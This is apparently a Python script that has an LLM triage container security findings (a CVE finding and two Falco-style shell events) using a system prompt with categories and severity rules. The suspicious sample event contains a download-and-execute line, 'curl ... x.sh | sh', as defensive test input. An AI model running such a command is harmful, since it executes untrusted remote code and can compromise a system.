import os

from langchain_openai import ChatOpenAI
from schema import Triage


finding = """Package: openssl 1.1.1k
Vulnerability: CVE-2022-0778
Severity: HIGH
Fixed version: 1.1.1n
Image: nginx:1.19"""

event_suspicious = """   Rule: Terminal shell in container
   Priority: Notice
   Output: A shell was spawned in a container with an attached terminal (user=root, container=payments-api, shell=bash, parent=java, cmdline=bash -c curl http://203.0.113.9/x.sh | sh)"""

event_benign = """   Rule: Terminal shell in container
   Priority: Notice
   Output: A shell was spawned in a container with an attached terminal (user=admin, container=debug-toolbox, shell=sh, parent=kubectl exec, cmdline=sh)"""
triager = ChatOpenAI(
    model=os.environ["LLM_MODEL"],
    base_url=os.environ["LLM_BASE_URL"],
    api_key=os.environ["LLM_API_KEY"],
    temperature=0,
).with_structured_output(Triage)

system_prompt = """You are a container security analyst triaging one finding at a time.

Categories:
- vulnerable_image: a known CVE in a package or base image.
- misconfiguration: an insecure setting, such as running as root or privileged mode.
- suspicious_runtime: behavior that suggests compromise, such as a shell spawned by an application process, a download piped into a shell, or access to sensitive files.
- benign: normal activity with a plausible legitimate explanation in the evidence, such as an admin using kubectl exec in a debug container.

Severity:
- Do not copy the tool's own priority label (for example "Notice") into severity. Rate by potential impact and evidence of compromise.
- critical: active compromise or remote code execution is evident.
- high: strong indicators of compromise, or a serious exploitable weakness.
- medium: a real weakness with limited exposure or impact.
- low: minor issues, and all benign events.

Rules:
- Use only the evidence given. Do not invent details.
- If the evidence supports a legitimate explanation, choose benign.
- Put exact quotes from the input in the evidence field."""

result = triager.invoke([
    ("system", system_prompt),
    ("user", event_suspicious),
])
print(result)

result = triager.invoke([
    ("system", system_prompt),
    ("user", event_benign),
])
print(result)
